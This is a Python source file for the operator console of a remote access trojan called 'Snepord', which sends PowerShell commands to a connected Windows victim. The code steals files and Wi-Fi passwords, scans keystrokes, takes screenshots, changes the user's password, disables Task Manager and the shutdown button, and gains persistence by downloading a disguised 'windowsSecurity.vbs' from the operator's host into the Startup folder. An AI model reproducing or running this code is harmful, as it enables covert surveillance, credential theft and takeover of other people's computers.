from .commands import Commands
import socket
import json
import platform
import base64
import os

class Server:
    def __init__(self,host:str="localhost",port:int=80) -> None:
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind((self.host,self.port))
        self.server.listen(0)

    def __str__(self) -> str:
        return f"Snepord\nHost:{self.host}\nPort:{self.port}"

    def start_server(self):
        print(f"\nSnepord listening on port {self.port}")
        self.connection,address = self.server.accept() 
        self.client_host = address[0]
        self.client_port = address[1]
        self.client_device=socket.getfqdn(self.client_host)
        print(f"Connected to {self.client_device} @{self.client_host}:{self.client_port}")
    
    def send_data(self,data):
        data = json.dumps(data)
        self.connection.send(bytes(data,'utf-8'))    
    
    def receive_data(self):
        recived=""
        while True:
            try:
                recived = recived + self.connection.recv(1024).decode('utf-8')
                recived = json.loads(recived)
                return recived
            except ValueError:
                continue
    
    def download_file(self,filename):
        self.send_data(f"""[convert]::ToBase64String((get-content "{filename}" -encoding byte))""")
        file_data = self.receive_data()
        with open(filename,'wb')as file:
            file.write(base64.b64decode(file_data))
    
    def upload_file(self,filename):
        with open(filename,'rb')as file:
            file_data = file.read()
            file_data = base64.b64encode(file_data).decode()
            file_data = f"""$data=("{file_data}");$bytes = [Convert]::FromBase64String($data);[IO.File]::WriteAllBytes('{filename}',$bytes);"""
            self.send_data(file_data)
            self.receive_data()   
    def check_admin(self):
        self.send_data(Commands.check_admin())
        if self.receive_data() == "True  ":
            return True
        else:
            return False        
    def execute(self):

        while True:
            try:
                commands = input("Snepord>> ")
                if len(commands)==0:
                    continue    
            except KeyboardInterrupt:
                print("Keyboard interupt detected")
                print("closing...")
                exit()
            except Exception as e:
                print(e)
                exit()    

            match commands:
                case "clear":
                    Commands.clear()
                case "help":
                    Commands.help()
                case "exit":
                    exit()
                case "leavemealone":
                    self.send_data("exit")
                    exit()      
                case "show_desktop":
                    self.send_data(Commands.show_desktop())
                    self.receive_data()
                case "shutdown":
                    print("shutting down..")
                    self.send_data(Commands.shutdown())
                    exit()
                case "reboot":
                    print("rebooting..")
                    self.send_data(Commands.reboot())
                    exit()
                case "lock":
                    self.send_data(Commands.lock())
                case "logoff":
                    self.send_data(Commands.logoff())
                case "eject_dvd":
                    self.send_data(Commands.eject_dvd_drive())
                    self.receive_data()
                case "amiroot":
                    self.send_data(Commands.check_admin())
                    print(self.receive_data()) 
                case "send_message":
                    title = input("Title: ")
                    message = input("Message: ")
                    self.send_data(Commands.send_message(title,message))    
                    self.receive_data()
                case "send_notification":
                    icon = input("Icon [NONE,Warning,Error,Info]: ")
                    title = input("Title: ")
                    message = input("Message: ")
                    self.send_data(Commands.fake_notification(icon,title,message))
                    self.receive_data()    
                case "clear_Run":
                    self.send_data(Commands.clear_run_history())
                case "get_admin":
                    self.send_data(Commands.get_admin(self.host))
                    self.receive_data()    

                case default:
                    commands = commands.split()   

                    if commands[0] == "speak":
                        text = Commands.convert_to_string(commands[1:])
                        self.send_data(Commands.speak(text))
                        print(self.receive_data())
                    elif commands[0]== "wallpaper":
                        if commands[1] == '-file':
                            file = commands[2]
                            self.upload_file(file)
                            self.send_data(Commands.change_wallpaper_from_file(file))
                            print(self.receive_data())
                        else:
                            link = commands[1]    
                            self.send_data(Commands.change_wallpaper_from_link(link))
                            self.receive_data()
                    elif commands[0] == "freeze":
                        
                        if len(commands)==2:
                            self.send_data(Commands.check_admin())
                            data = self.receive_data()
                            if len(data) == 7:
                                print("require admin priveledges!")
                                break
                            print("hello")
                            self.send_data(Commands.freeze(commands[1]))      
                            self.receive_data()  
                        
                    elif commands[0]== "volume":
                        self.send_data(Commands.set_volume(commands[1]))
                        self.receive_data()
                    elif commands[0] == "disable" :
                        if self.check_admin()=="True":
                            if commands[1] == "taskmanager":
                                self.send_data(Commands.disable_taskmanager())
                            elif commands[1] == "shutdown":
                                self.send_data(Commands.disable_shutdownbutton())
                            elif commands[1] == "restart":
                                self.send_data(Commands.disable_restartbutton())
                        else:
                            pass
                    elif commands[0] == "enable":
                        if self.check_admin()=="True":
                            if commands[1] == "taskmanager":
                                self.send_data(Commands.enable_taskmanager())
                            elif commands[1] == "shutdown":
                                self.send_data(Commands.enable_shutdownbutton())                                
                            elif commands[1] == "restart":
                                self.send_data(Commands.enable_restartbutton())                                
                        else:
                            pass                            
                    elif commands[0] == "press":
                        key = Commands.convert_to_string(commands[1:])
                        self.send_data(Commands.press_key(key))
                        self.receive_data()
                    elif commands[0] == "kill":
                        if commands[1] == 'pid':
                            self.send_data(Commands.kill_process(commands[2]))
                            self.receive_data()
                        else:
                            self.send_data(Commands.kill_application(commands[1]))    
                            self.receive_data()
                    elif commands[0] == "edit":
                        self.download_file(commands[1])
                        if platform.system() == 'Windows':
                            os.system(f"notepad {commands[1]}")
                            
                        else:
                            os.system(f'nano {commands[1]}')
                        self.upload_file(commands[1])
                        os.remove(commands[1])
                    elif commands[0] == "remove":
                        self.send_data(f"Remove-Item {commands[1]} ")
                        self.receive_data()
                    elif commands[0] == "rename":
                        self.send_data(f"Rename-Item {commands[1]} {commands[2]}")
                        self.receive_data()
                    elif commands[0] == "get_persistence":
                        file = commands[1]
                        self.send_data(f"""iwr -Uri "http://{self.host}:8080/{file}" -Outfile "C:\\Users\\$env:UserName\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windowsSecurity.vbs";""")
                        self.receive_data()    
                    elif commands[0] == "create":
                        if commands[1] == "file":
                            self.send_data(Commands.create_file(commands[2]))
                            self.receive_data()
                        elif commands[1] == "folder" or commands[1] == "directory":
                            self.send_data(Commands.create_directory(commands[2])) 
                            self.receive_data()
                        else:
                            pass        
                    elif commands[0] == "change_password":
                        if len(commands)  < 2:
                            print("require a password to change")
                        self.send_data(Commands.change_password(commands[1]))


                    elif commands[0] == "get_wifipassword":
                        self.send_data(Commands.get_wifipassword())
                        print(self.receive_data())
                    elif commands[0] == "keyscan":
                        self.send_data(Commands.key_scan(commands[1]))
                        print(self.receive_data())
                    elif commands[0] == "blank_screen":
                        self.send_data(Commands.blank_screen())
                        self.receive_data()    
                    elif commands[0] == "upload":
                        self.upload_file(Commands.convert_to_string(commands[1:]))    
                    elif commands[0] == "download":
                        self.download_file(Commands.convert_to_string(commands[1:]))
                    elif commands[0] == "take_screenshot":
                        self.send_data(Commands.take_screenshot())
                        self.receive_data()
                        self.send_data("""cd "C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\" """)
                        self.receive_data()
                        self.download_file("screenshot.png")
                        self.send_data("cd ~")
                        self.receive_data()
                    elif commands[0] == "move":
                        self.send_data(Commands.move_item(commands[1],commands[2]))   
                        self.receive_data()
                    elif commands[0] == "schedule_task_at_startup":
                        self.send_data(Commands.schedule_task_at_startup(commands[1]))
                        self.receive_data()    
                    elif commands[0] == "load_reg_persistence":
                        self.send_data(Commands.run_file_at_startup(Commands[1]))  
                        self.receive_data()  
                    else:
                        commands = Commands.convert_to_string(commands)
                        self.send_data(commands)
                        print(self.receive_data())

